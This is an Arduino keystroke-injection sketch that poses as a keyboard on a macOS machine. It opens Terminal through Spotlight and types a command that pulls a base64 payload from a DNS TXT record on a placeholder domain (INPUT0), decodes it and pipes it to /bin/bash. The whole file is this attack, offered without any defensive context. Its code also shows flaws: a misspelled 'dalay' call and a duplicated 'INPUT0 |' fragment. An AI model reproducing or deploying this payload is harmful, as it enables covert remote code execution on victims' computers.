void setup()
{
  Keyboard.begin();
}
void loop()
{
  delay(5000);
  run("terminal");
  delay(3000);
  Keyboard.print(F("nslookup -querytype=txt INPUT0 |"));
  delay(200);
  Keyboard.print(F(" INPUT0 |"));
  delay(200);
  Keyboard.print(F("grep text | cut -d \" \" -f3-"));
  delay(200);
  Keyboard.print(F(" | tr -d \"\\\"\" | base64 -D"));
  delay(200);
  Keyboard.println(F(" | /bin/bash"));
  while(true); 
}

void run(char *SomeCommand){
  //on Yosemite you launch spotlight with CTRL+SPACEBAR
  //not APPLE+SPACEBAR
  Keyboard.press(KEY_LEFT_CTRL);
  Keyboard.press(' ');
  dalay(500);
  Keyboard.releaseAll();

  Keyboard.println(SomeCommand);
}

